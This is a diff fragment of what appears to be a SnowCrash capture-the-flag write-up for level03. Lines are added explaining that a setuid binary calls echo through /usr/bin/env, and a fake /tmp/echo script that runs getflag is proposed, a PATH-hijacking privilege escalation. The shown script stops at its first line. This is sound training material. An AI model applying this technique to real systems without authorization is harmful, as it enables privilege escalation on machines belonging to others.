@@ -50,7 +50,9 @@ system("/usr/bin/env echo Exploit me"Exploit me
 <... system resumed> )                                                                                                                             = 0
 +++ exited (status 0) +++
 ```
+from the line `system("/usr/bin/env echo Exploit me"Exploit me`, the echo is executed from the location within the env variable.
 
+What if I change the env variable to execute the command `echo`? furthermore, what if the script for `echo` contains the execution of the `getflag`?
 ```
 level03@SnowCrash:~$ vi /tmp/echo
 #!/bin/bash
